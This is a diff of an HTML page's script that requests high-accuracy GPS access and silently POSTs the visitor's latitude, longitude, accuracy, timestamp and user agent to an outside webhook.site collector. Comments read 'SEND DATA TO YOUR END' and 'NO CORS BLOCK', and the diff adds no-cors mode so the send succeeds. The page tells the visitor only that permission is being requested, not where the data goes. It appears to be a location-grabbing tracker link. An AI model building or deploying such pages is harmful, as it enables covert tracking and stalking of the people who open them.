@@ -10,40 +10,51 @@
 <p id="status">Requesting GPS permission…</p>
 
 <script>
-navigator.geolocation.getCurrentPosition(
-  (pos) => {
-    const data = {
-      latitude: pos.coords.latitude,
-      longitude: pos.coords.longitude,
-      accuracy: pos.coords.accuracy,
-      time: new Date().toISOString(),
-      userAgent: navigator.userAgent
-    };
+if (!navigator.geolocation) {
+  document.getElementById("status").innerText =
+    "Geolocation not supported on this device.";
+} else {
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      const data = {
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent
+      };
 
-    // SEND DATA TO YOUR END (Webhook)
-    fetch("https://webhook.site/30f14c22-c02f-4d1c-ad3c-6e72844a7dc6", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data)
-    });
+      // SEND GPS DATA TO YOUR WEBHOOK (NO CORS BLOCK)
+      fetch("https://webhook.site/30f14c22-c02f-4d1c-ad3c-6e72844a7dc6", {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      });
 
-    document.getElementById("status").innerText =
-      "Location captured successfully.";
-  },
-  (err) => {
-    document.getElementById("status").innerText =
-      "Location access denied";
-  },
-  {
-    enableHighAccuracy: true,
-    timeout: 15000,
-    maximumAge: 0
-  }
-);
+      document.getElementById("status").innerText =
+        "Location captured successfully.";
+    },
+    (err) => {
+      document.getElementById("status").innerText =
+        "Location access denied.";
+    },
+    {
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 0
+    }
+  );
+}
 </script>
 
 </body>
 </html>
+
+</html>
+
 
 
 
